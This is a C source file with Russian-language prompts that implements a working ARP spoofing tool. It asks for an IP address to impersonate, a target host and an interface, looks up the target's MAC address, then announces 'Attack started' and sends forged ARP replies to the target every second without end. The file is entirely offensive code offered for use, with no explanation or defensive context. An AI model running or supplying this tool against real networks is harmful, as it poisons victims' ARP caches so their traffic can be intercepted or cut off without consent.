#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <sys/ioctl.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>


int get_data(char* mask_ip, char* target_ip, char* interface) {
    printf("=============== Данные ===============\n");
    printf("Mask IP: ");
    scanf("%15s", mask_ip);
    printf("Target IP: ");
    scanf("%15s", target_ip);
    printf("Interface: ");
    scanf("%10s", interface);
    return 0;
}

struct __attribute__((packed)) arp_packet {
    struct ethhdr eth;
    struct arphdr arp;
    unsigned char src_mac[6];
    unsigned char src_ip[4];
    unsigned char dst_mac[6];
    unsigned char dst_ip[4];
};

int main() {
    if (getuid() != 0) {
    fprintf(stderr, "Ошибка: программу нужно запускать через sudo\n");
    return 1;
}
    char mask_ip[16], target_ip[16], interface[11];
    unsigned char target_mac[6];

    int status = get_data(mask_ip, target_ip, interface);
    if (status != 0) {perror("Ошибка получения входных данных."); return 1;}

    printf("\n============= Подготовка =============\n");

    int sock_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock_fd < 0) {perror("Ошибка сокета."); return 1;}

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

    if (ioctl(sock_fd, SIOCGIFINDEX, &ifr) < 0) {perror("Ошибка ioctl(INDEX)"); return 1;}
    int ifindex = ifr.ifr_ifindex;

    if (ioctl(sock_fd, SIOCGIFHWADDR, &ifr) < 0) {perror("Ошибка ioctl HWADDR"); return 1;}
    unsigned char* my_mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;

    struct arp_packet pkt;
    memset(&pkt, 0, sizeof(pkt));

    memcpy(pkt.eth.h_dest, "\xff\xff\xff\xff\xff\xff", 6);
    memcpy(pkt.eth.h_source, my_mac, 6);
    pkt.eth.h_proto = htons(ETH_P_ARP);

    pkt.arp.ar_hrd = htons(ARPHRD_ETHER);
    pkt.arp.ar_pro = htons(ETH_P_IP);
    pkt.arp.ar_hln = 6;
    pkt.arp.ar_pln = 4;
    pkt.arp.ar_op = htons(ARPOP_REQUEST);  

    memcpy(pkt.src_mac, my_mac, 6);
    inet_pton(AF_INET, mask_ip, pkt.src_ip);
    memset(pkt.dst_mac, 0, 6);
    inet_pton(AF_INET, target_ip, pkt.dst_ip);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = ifindex;
    sa.sll_halen = 6;
    memcpy(sa.sll_addr, "\xff\xff\xff\xff\xff\xff", 6);
    printf("[*] Поиск MAC-адреса цели (%s)\n", target_ip);
    sendto(sock_fd, &pkt, sizeof(pkt), 0, (struct sockaddr*)&sa, sizeof(sa));

    while (1) {
        struct arp_packet recv_pkt;
        if (recv(sock_fd, &recv_pkt, sizeof(recv_pkt), 0) <= 0) continue;

        if (htons(recv_pkt.arp.ar_op) == ARPOP_REPLY &&
            memcmp(recv_pkt.src_ip, pkt.dst_ip, 4) == 0) {
            memcpy(target_mac, recv_pkt.src_mac, 6);
            printf("[+] MAC найден: %02x:%02x:%02x:%02x:%02x:%02x\n",
                   target_mac[0], target_mac[1], target_mac[2],
                   target_mac[3], target_mac[4], target_mac[5]);
            break;
        }
    }

    printf("\n============ Атака начата ============\n");

    pkt.arp.ar_op = htons(ARPOP_REPLY);
    memcpy(pkt.eth.h_dest, target_mac, 6);
    memcpy(pkt.dst_mac, target_mac, 6);

    int count = 0;
    while (1) {
        if (sendto(sock_fd, &pkt, sizeof(pkt), 0, (struct sockaddr*)&sa, sizeof(sa)) > 0) {
            printf("\rОтправлено пакетов: %d", ++count);
            fflush(stdout);
        }
        sleep(1);
    }
    close(sock_fd);
    return 0;
}


